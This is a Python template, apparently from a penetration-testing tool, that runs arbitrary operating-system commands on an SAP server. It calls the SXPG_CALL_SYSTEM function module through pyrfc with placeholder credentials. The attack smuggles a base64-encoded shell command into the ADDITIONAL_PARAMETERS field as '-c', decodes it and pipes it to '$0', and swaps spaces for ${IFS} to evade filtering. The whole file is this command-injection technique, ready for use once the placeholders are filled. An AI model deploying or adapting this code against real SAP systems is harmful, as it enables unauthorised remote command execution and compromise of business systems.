#!/usr/bin/env python3

import base64

try:
    from pyrfc import Connection
except ImportError:
    Connection = None  # Handle missing pyrfc gracefully


def execute(command: str, timeout: float = 30) -> str:
    """Execute a command using SAP's SXPG_CALL_SYSTEM function module."""

    # Build connection parameters
    conn_params = {
        "user": "<USERNAME>",
        "passwd": "<PASSWORD>",
        "client": "<CLIENT>",
        "lang": "EN",
        "config": {"timeout": timeout},
    }

    # Connection mode specific parameters
    <CONNECTION_PARAMS>

    # Add optional parameters if present
    <TRACE_PARAM>

    # Establish connection to the SAP system
    conn = Connection(**conn_params)

    command = base64.b64encode(
        command.encode()
    ).decode()  # Base64 encode the command to handle special characters

    command = f"echo {command}|base64 -d|$0"

    command = command.replace(" ", "${IFS}")

    # Call the SXPG_CALL_SYSTEM function module
    response = conn.call(
        "SXPG_CALL_SYSTEM",
        **{
            "COMMANDNAME": "ZPENTEST",
            "ADDITIONAL_PARAMETERS": f"-c {command}",
        },
    )

    # Close connection
    conn.close()

    # Process and return the output
    results = response["EXEC_PROTOCOL"]
    result_txt = ""
    for result in results:
        result_txt = f"{result_txt}{result['MESSAGE']}\n"

    return result_txt
